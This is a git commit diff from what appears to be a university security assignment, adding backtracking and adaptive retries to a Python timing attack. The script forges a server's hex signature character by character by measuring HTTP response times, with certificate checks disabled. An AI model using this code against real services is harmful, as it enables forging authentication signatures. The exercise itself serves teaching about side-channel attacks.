d3077012bfd0186910eec7b141a11fe181c7e9dd
VictorWinberg <dat14vwi@student.lu.se>
2017-12-10 20:50:03 +0100

    add backtracking to HA4 B2

--- HA4/B2.py
+++ HA4/B2.py
@@ -1,4 +1,5 @@
 import requests
+from datetime import datetime
 
 requests.packages.urllib3.disable_warnings()
 
@@ -8,29 +9,41 @@ def timing_attack(name, grade, size=20, retries=10):
   params = {'name': name, 'grade': grade, 'signature': ''}
   hex_string = '0123456789abcdef'
   print('Searching...')
+  start = datetime.now()
 
-  signature = []
+  signature = [''] * size
+  i, T = 0, [0] + [float('inf')] * size
 
-  for i in range(size):
+  while(i < size):
     max_char, max_t = None, 0
 
     for j in range(len(hex_string)):
       curr_char = hex_string[j]
-      params['signature'] = ''.join(signature) + curr_char
+      params['signature'] = ''.join(signature)[:i] + curr_char
 
       R = [requests.get(url, params, verify=False) for retry in range(retries)]
       t = min([r.elapsed.total_seconds() for r in R])
 
-      if(t > max_t):
+      if t > max_t:
         max_char, max_t = curr_char, t
 
-    signature.append(max_char)
+      if t < T[i+1]:
+        T[i+1] = t
 
-    print('{}/{}'.format(i+1, size), ''.join(signature))
+    if not T[i] < T[i+1]:
+      i = max(i - 1, 0)
+      retries += 1
+      print('{}/{} redo with retries: {}'.format(i, size, retries))
+    else:
+      signature[i] = max_char
+      i += 1
+
+    print('{}/{}'.format(i, size), ''.join(signature)[:i])
   
   params['signature'] = ''.join(signature)
   r = requests.get(url, params, verify=False)
   print('Sign verified:', int(r.text) == 1)
+  print('Elapsed time', datetime.now() - start)
 
   return params
 
